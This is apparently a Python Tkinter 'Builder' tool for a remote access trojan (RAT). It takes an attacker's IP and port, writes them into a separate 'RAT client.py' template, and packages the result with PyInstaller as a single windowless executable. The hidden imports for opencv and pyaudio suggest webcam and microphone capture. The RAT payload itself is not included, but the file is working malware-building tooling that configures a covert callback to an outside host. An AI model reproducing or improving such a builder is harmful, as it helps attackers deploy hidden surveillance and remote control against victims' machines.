import os , sys , easygui , subprocess
import tkinter as tk
import math

initialize = lambda obj , x_coord , y_coord: obj.place(x = x_coord , y = y_coord)

cartella = os.path.dirname(sys.argv[0])

def e_t_i(id: int):
    if id == 1:
        tk.messagebox.showwarning("Warning" , f"RAT client.py not found in {cartella}!")
    if id == 2:
        tk.messagebox.showwarning("Warning" , f"PORT and/or IP not found!")

def Build(IP , PORT):
    isthere = False
    if "RAT client.py" in os.listdir(cartella):
        isthere = True
        percorso_rat = os.path.join(cartella , "RAT client.py")
    
    if IP and PORT and isthere:
        with open(percorso_rat , "r") as file:
            data = file.read()
            temporary_data = data.replace("%CLIENT_IP%" , f"{IP}").replace("%CLIENT_PORT%" , f"{PORT}")
            file.close()
        with open(os.path.join(cartella , "temporary.py") , "w" , encoding="utf-8") as temp:
            temp.write(temporary_data)
            temp.close()
        subprocess.call(rf'pyinstaller "{os.path.join(cartella , "temporary.py")}" --noconsole --onefile --hidden-import colorama --hidden-import opencv-python --hidden-import numpy --hidden-import matplotlib --hidden-import pyaudio')
        os.remove(os.path.join(cartella , "temporary.py"))  
    elif not isthere:
        e_t_i(1)
    else:
        e_t_i(2)
        

gui = tk.Tk()
#///////////////////////// WINDOW CONFIGURATION /////////////////////////#

gui_x = 800
gui_y = 400
gui.geometry(f"{gui_x}x{gui_y}")
gui.configure(bg = "BLACK")

#//////////////////////////// WINDOW ELEMENTS ///////////////////////////#

Text1 = tk.Label(text="Builder")
Text1.configure(bg="BLACK" , fg="WHITE")
Text1.config(font = ("Terminal" , 23))
Text1.pack(anchor="center")

for n in range(2):
    Placeholder = tk.Label()
    Placeholder.config(bg="BLACK")
    Placeholder.pack(side = tk.BOTTOM)

Build_button = tk.Button(text="Build" , command= lambda: Build(IP_input.get() , PORT_input.get()))
Build_button.configure(height=1 , width= 16)
Build_button.pack(side= tk.BOTTOM)

Text2 = tk.Label(text="PORT:")
Text2.configure(bg="BLACK" , fg="WHITE")
Text2.config(font = ("Terminal" , 20))
initialize(Text2 , 55 , 100)

Text3 = tk.Label(text="IP:")
Text3.configure(bg="BLACK" , fg="WHITE")
Text3.config(font = ("Terminal" , 20))
initialize(Text3 , 595 , 100)


IP_input = tk.Entry()
initialize(IP_input , 595 , 134)

PORT_input = tk.Entry()
initialize(PORT_input , 55 , 134)

#////////////////////////////////////////////////////////////////////////#

gui.mainloop()
